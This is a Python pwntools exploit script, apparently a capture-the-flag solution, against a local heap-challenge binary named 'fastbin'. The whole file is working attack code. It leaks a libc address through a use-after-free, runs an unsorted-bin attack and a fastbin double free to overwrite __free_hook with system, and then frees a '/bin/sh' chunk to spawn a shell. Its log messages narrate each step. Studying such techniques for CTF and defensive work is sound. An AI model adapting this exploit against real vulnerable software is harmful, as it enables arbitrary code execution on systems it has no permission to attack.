from pwn import *
context.terminal = ['./gdbpwn-client.sh']

def create(p, index, size, data):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'Index:', index)
    p.sendlineafter(b'Size:', size)
    p.sendlineafter(b'Data:', data)

def delete(p, index):
    p.sendlineafter(b'>', b'4')
    p.sendlineafter(b'Index:', index)


def show(p, index):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'Index:', index)
    p.recvuntil(b'Data: ')
    return u64(p.recvline().rstrip().ljust(8, b'\x00'))

def edit(p, index, dat):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'Index:', index); time.sleep(0.2)
    p.sendline(dat)



def main():
    p = process('./fastbin')
    libc = ELF('./libc.so.6')
    gdb.attach(p)
    log.info(f'Setup leak block | create: idx=0; sz=512; dt=leak block'); time.sleep(0.2);
    create(p, b'0', b'512', b'leak')
    log.info(f'Setup UAF block | create: idx=0; sz=100; dt=uaf block 1'); time.sleep(0.2);
    create(p, b'1', b'100', b'fast bin 1')
    log.info(f'Setup UAF block | create: idx=0; sz=100; dt=uaf block 2'); time.sleep(0.2);
    create(p, b'2', b'100', b'fast bin 2')
    log.info(f'Setup top block | create: idx=0; sz=16; dt=/bin/sh'); time.sleep(0.2);
    create(p, b'3', b'16', b'/bin/sh\x00')

    ### leak libc base
    log.info(f'Leaking address | delete: 0'); time.sleep(0.2);
    delete(p, b'0')
    log.info(f'Now chunk contain data of fd & bk pointer')
    log.info(f'Cause after free it wont reset pointer to null so we can show it up to leak address')
    # main_arena + 88
    leak = show(p, b'0')
    log.info(f'leak: {hex(leak)}'); time.sleep(0.2)
    #pause()
    log.info(f'Use leak address to calculate address off function we want')
    libc.address = leak - 0x3c4b78
    free_hook = libc.sym['__free_hook']
    system = libc.sym['system']
    log.info(f'libc_base: {hex(libc.address)}'); time.sleep(0.2)
    log.info(f'&__free_hook: {hex(free_hook)}'); time.sleep(0.2)
    log.info(f'system: {hex(system)}')
    # for later double free

    ### unsorted bin attack to write a pointer to before free_hook for later fast bin attack
    log.info(f'Trigger unsorted bin block | edit: idx=0; dt= AAAAAAAA + __free_hook-0x10 | create: idx=0; sz=512; dt=trigger ub'); time.sleep(0.2);
    # put chunk into unsorted bin
    # uaf
    edit(p, b'0', p64(0) + p64(free_hook-0x1d))
    # trigger unsorted bin attack
    create(p, b'0', b'512', b'trigger ub')
    log.info('Done writing to __free_hook + 0x10')
    #pause()
    ### write to __free_hook using double free
    delete(p, b'1')
    delete(p, b'2')
    delete(p, b'1')

    create(p, b'0', b'100', p64(free_hook-0x10))

    create(p, b'0', b'100', b'junk')

    create(p, b'0', b'100', b'junk')

    create(p, b'0', b'100', p64(system))

    log.info('Done writing system to __free_hook')


    # spawn shell
    time.sleep(0.2)
    log.info('Enjoy shell~~~ hecked by iluvinn')
    pause()
    delete(p, b'3')
    p.interactive()


if __name__ == "__main__":
    main()



